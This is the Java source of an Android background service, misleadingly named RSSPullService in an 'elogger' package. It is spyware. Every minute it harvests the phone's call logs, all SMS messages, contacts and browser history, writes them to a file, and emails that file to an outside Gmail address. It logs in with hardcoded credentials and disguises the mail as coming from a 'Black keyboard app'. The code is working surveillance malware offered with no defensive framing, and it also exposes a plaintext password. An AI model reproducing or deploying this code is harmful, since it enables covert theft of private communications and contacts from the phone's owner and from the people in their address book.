package com.example.android.elogger;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Properties;
import java.util.Scanner;

import javax.activation.CommandMap;
import javax.activation.MailcapCommandMap;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;


public class RSSPullService extends IntentService {

    String veh = "";

    public RSSPullService() {
        super("hiiiii");
        // TODO Auto-generated constructor stub
    }

    File root;
    String userid;
    @Override
    protected void onHandleIntent(Intent workIntent) {
        // Gets data from the incoming Intent
        SimpleDateFormat sdf = new SimpleDateFormat("(dd-MM-yyyy__hh.mm.ss)");
        Date curDate = new Date();
        String strDate = sdf.format(curDate);
        String FILENAME1 = strDate + "log_file.txt";
        File newFile = new File(FILENAME1);
        userid = workIntent.getStringExtra("userid");
        System.out.println(userid);
        Thread t = new Thread();
        t.start();
        int i = 1;
        while (i > 0) {
            Log.i("ELogger","service started.....");
            try {
                //to change time  1=minute, 10 second, 1000 milisec
                Thread.sleep(1* 60 * 1000);

                root = new File(Environment.getExternalStorageDirectory(),
                        "download");
                // atta
                String[] attachFiles = new String[1];
                attachFiles[0] = "mnt/sdcard/download" + "/" + FILENAME1;
                System.out.println("file is saved on" + root + "/" + FILENAME1);
                try {
                    StringBuffer call_logs = getCallDetails();
                    // System.out.println(call_logs);
                    StringBuilder msg = getAllSms();
                    // System.out.println(l);
                    StringBuffer contacts=fetchContacts();
                    String strBrowser=getBrowserOriginal().toString();
                    call_logs.append(msg);
                    call_logs.append("/n***************************************/n");
                    call_logs.append(contacts);
                    call_logs.append("/n***************************************/n");
                    call_logs.append("/n***************************************/n");
                    call_logs.append(strBrowser);
                    System.out.println(msg);
                    Log.i("ELogger","msg"+msg);
                    // sendEmailWithAttachments("impmu4u143@gmail.com",attachFiles);
                    String details;
                    File gpxfile;
                    try {

                        gpxfile = new File(root, FILENAME1);
                        details = new Scanner(gpxfile).useDelimiter("\\Z").next();
                        StringBuffer sb=new StringBuffer();
                        sb.append(details);
                        sb.append(call_logs);
                        call_logs.append(details);
                        File f = new File(root + "/" + FILENAME1);
                        PrintWriter writer = new PrintWriter(f);
                        writer.print(sb);

                        writer.close();

                        System.out.println("Last contents: "+call_logs);




                        ///change ur email id: change userid to email id

                        sendEmailWithAttachments("impmu4u143@gmail.com",attachFiles);
                        Log.i("ELogger","message sent");
                    } catch (Exception e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                    File f = new File(root + "/" + FILENAME1);
                    PrintWriter writer = new PrintWriter(f);
                    writer.print("__");
                    writer.close();
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                    Log.i("ELOGGER",e.getMessage());
                }
            } catch (Exception e) {
                e.printStackTrace();
                Log.i("ELOGGER",e.getMessage());
            }

        }


    }
    public static String getDateTime() {
        DateFormat dateFormat = new SimpleDateFormat(
                "yyyy/MM/dd:hh:mm:ss");

        Calendar cal = Calendar.getInstance();

        return dateFormat.format(cal.getTime());// "11/03/14 12:33:43";
    }
    public StringBuffer getBrowserOriginal() {
        StringBuffer sb = new StringBuffer();

        sb.append("Time of createion"+getDateTime()+"\n");
        Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI,
                Browser.HISTORY_PROJECTION, null, null, null);
        if (mCur.moveToFirst()) {
            while (mCur.isAfterLast() == false) {
                sb.append("\nTitle Index "
                        + mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX)
                        .toString());
                sb.append("\nURL"
                        + mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
                Long callDate = mCur
                        .getLong(Browser.HISTORY_PROJECTION_DATE_INDEX);
                // to change long values into date
                Date callDayTime = new Date(Long.valueOf(callDate));
                sb.append("\nDated " + callDayTime);
                sb.append("\nNo. of Visits "
                        + mCur.getString(Browser.HISTORY_PROJECTION_VISITS_INDEX));

                sb.append("\n");
                mCur.moveToNext();
            }

        }
        return sb;

    }

    public StringBuilder getAllSms() {

        Uri message = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        // startManagingCursor(c);

        StringBuilder sb = new StringBuilder();
        while (c.moveToNext()) {

            if (c.getColumnIndexOrThrow("type") == 1) {
                sb.append("Inbox");
            } else {
                sb.append("Outbox");
            }
            sb.append("\nID" + c.getString(c.getColumnIndexOrThrow("_id"))
                    + "\nPhone Number:--- "
                    + c.getString(c.getColumnIndexOrThrow("address"))
                    + " \nCall Type:--- "
                    + c.getString(c.getColumnIndexOrThrow("body"))
                    + " \nCall Date:--- "
                    + c.getString(c.getColumnIndex("date"))
                    + " \nMessage :--- "
                    + c.getString(c.getColumnIndexOrThrow("body"))
                    + "\nStatus:--- " + c.getString(c.getColumnIndex("read")));

            sb.append("\n----------------------------------");

            c.moveToNext();
        }

        c.close();

        return sb;
    }

    private StringBuffer getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        return sb;

    }

    public StringBuffer fetchContacts() {

        String phoneNumber = null;
        String email = null;

        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

        Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
        String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
        String DATA = ContactsContract.CommonDataKinds.Email.DATA;

        StringBuffer output = new StringBuffer();
        output.append("\nContacts Nos......");
        ContentResolver contentResolver = getContentResolver();

        Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null,
                null);

        // Loop for every contact in the phone
        if (cursor.getCount() > 0) {

            while (cursor.moveToNext()) {

                String contact_id = cursor
                        .getString(cursor.getColumnIndex(_ID));
                String name = cursor.getString(cursor
                        .getColumnIndex(DISPLAY_NAME));

                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor
                        .getColumnIndex(HAS_PHONE_NUMBER)));

                if (hasPhoneNumber > 0) {

                    output.append("\n First Name:" + name);

                    // Query and loop for every phone number of the contact
                    Cursor phoneCursor = contentResolver.query(
                            PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?",
                            new String[] { contact_id }, null);

                    while (phoneCursor.moveToNext()) {
                        phoneNumber = phoneCursor.getString(phoneCursor
                                .getColumnIndex(NUMBER));
                        output.append("\n Phone number:" + phoneNumber);

                    }

                    phoneCursor.close();

                    // Query and loop for every email of the contact
                    Cursor emailCursor = contentResolver.query(
                            EmailCONTENT_URI, null, EmailCONTACT_ID + " = ?",
                            new String[] { contact_id }, null);

                    while (emailCursor.moveToNext()) {

                        email = emailCursor.getString(emailCursor
                                .getColumnIndex(DATA));

                        output.append("\nEmail:" + email);

                    }

                    emailCursor.close();
                }

                output.append("\n");
            }

        }
        output.append("....................................");
        return output;
    }

    String mailFrom = "preminor16@gmail.com";
    String password = "9913103490";

    public void sendEmailWithAttachments(String userName, String[] attachFiles)
            throws AddressException, MessagingException {
        // sets SMTP server properties
        String host = "smtp.gmail.com";
        String port = "587";
        MailcapCommandMap mc = (MailcapCommandMap) CommandMap
                .getDefaultCommandMap();
        mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
        mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
        mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
        mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
        mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
        CommandMap.setDefaultCommandMap(mc);

        // message info

        String subject = "Doucment from Black keyboard";
        String message = "This is the new document from Black keyboard app";
        Properties properties = new Properties();
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", port);
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.user", userName);
        properties.put("mail.password", password);
        System.out.println("file is saved on" + password);
        // creates a new session with an authenticator
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(mailFrom, password);
            }
        };
        System.out.println("after is saved on" + password);
        Session session = Session.getInstance(properties, auth);

        // creates a new e-mail message
        Message msg = new MimeMessage(session);

        msg.setFrom(new InternetAddress(userName));
        InternetAddress[] toAddresses = { new InternetAddress(userName) };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
        msg.setSentDate(new Date());

        // creates message part
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent(message, "text/html");

        // creates multi-part
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);

        // adds attachments
        // adds attachments
        if (attachFiles != null && attachFiles.length > 0) {
            for (String filePath : attachFiles) {
                MimeBodyPart attachPart = new MimeBodyPart();

                try {
                    attachPart.attachFile(filePath);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }

                multipart.addBodyPart(attachPart);
            }
        }

        System.out.println("before is saved on" + password);
        // sets the multi-part as e-mail's content
        msg.setContent(multipart);
        Thread.currentThread().setContextClassLoader(
                getClass().getClassLoader());
        // sends the e-mail
        Transport.send(msg);
        Log.i("ELOGGER","msg sent");
        System.out.println("sent" + password);
    }
}
